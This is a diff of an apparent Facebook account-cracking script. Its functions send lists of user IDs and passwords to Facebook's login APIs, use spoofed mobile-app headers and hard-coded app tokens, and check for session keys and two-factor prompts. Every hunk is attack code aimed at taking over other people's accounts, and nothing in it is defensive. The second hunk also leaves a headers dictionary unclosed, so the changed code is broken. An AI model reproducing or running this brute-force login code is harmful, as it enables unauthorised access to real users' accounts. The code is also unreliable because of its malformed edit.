@@ -1203,15 +1203,18 @@ def trt2(ids,passlist):
 				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
 				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
 			head = {
-'access-control-allow-origin': '*',
-'facebook-api-version': 'v18.0',
-'strict-transport-security': 'max-age=15552000',
-'pragma': 'no-cache',
-'cache-control': 'private, no-cache, no-store, must-revalidate',
-'x-fb-request-id': 'Azr6J19Y_vLGivvdjtb2z0Q',
-'x-fb-trace-id': 'CmvYoBAbP07',
-'x-fb-rev': '1009911867',
-'x-fb-debug': 'ZuKqIHIN5ehxUc3nvpLedJWwbtkUZFLp4GLpnJbB1kam2ooGddYDE3hl95n3EzaP0us9+dg1or7vkAKPt9p2AA==',
+'content-type':'application/x-www-form-urlencoded',
+				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+				'x-fb-connection-type':'unknown',
+				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+				'api_key': '8114af471d039628db5c68cb127af936',
+				'user-agent':ua_string,
+				'x-fb-net-hni':str(random.randint(2e4,4e4)),
+				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+				'x-fb-connection-quality':'EXCELLENT',
+				'x-fb-friendly-name':'authenticate',
+				'accept-encoding':'gzip, deflate',
+				'x-fb-http-engine':	'Liger'}
 			url = 'https://b-api.facebook.com/method/auth.login'
 			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 			q = json.loads(po)
@@ -1292,15 +1295,17 @@ def trt3(ids,passlist):
                                 'fb_api_req_friendly_name':'authenticate',
                         }
                         headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
+                                'access-control-allow-origin': '*',
+'facebook-api-version': 'v18.0',
+'strict-transport-security': 'max-age=15552000',
+'pragma': 'no-cache',
+'cache-control': 'private, no-cache, no-store, must-revalidate',
+'x-fb-request-id': 'Azr6J19Y_vLGivvdjtb2z0Q',
+'x-fb-trace-id': 'CmvYoBAbP07',
+'x-fb-rev': '1009911867',
+'x-fb-debug': 'ZuKqIHIN5ehxUc3nvpLedJWwbtkUZFLp4GLpnJbB1kam2ooGddYDE3hl95n3EzaP0us9+dg1or7vkAKPt9p2AA==',
+              
+                      url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
